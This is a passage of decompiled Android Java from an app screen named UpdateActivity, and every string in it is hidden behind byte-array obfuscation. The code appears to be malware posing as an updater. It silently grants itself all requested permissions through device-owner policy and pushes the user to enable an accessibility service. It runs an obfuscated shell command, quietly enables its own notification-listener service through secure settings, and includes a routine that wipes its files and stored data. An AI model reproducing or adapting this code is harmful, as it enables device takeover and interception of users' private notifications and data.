                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i18) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        final int i17 = 1;
        this.f1681d.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i18 = i17;
                final UpdateActivity updateActivity = this.f3455c;
                final int i19 = 1;
                final int i110 = 0;
                switch (i18) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i110 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i110], 1);
                                            i110++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList8 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList8.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager8 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager8.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList9 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList9.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager9 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager9.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
                                Log.e(strM2421h, AbstractC1387m.m2421h(new byte[]{-47, 14, 100, 118, -81, -49, -8, 87, -8, 79, 106, 104, -85, -59, -84, 3, -7, 0, 121, 115, -84, -62, -69, 66, -29, 6, 98, 116, -22, -57, -79, 80, -29, 10, 99, ByteCompanionObject.MAX_VALUE, -72, -117, -88, 70, -27, 2, 100, 105, -71, -62, -73, 77, -83, 79}, new byte[]{-105, 111, 13, 26, -54, -85, -40, 35}) + e11.getMessage());
                            }
                        }
                        if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i110 < length2) {
                                fileArrListFiles2[i110].delete();
                                i110++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
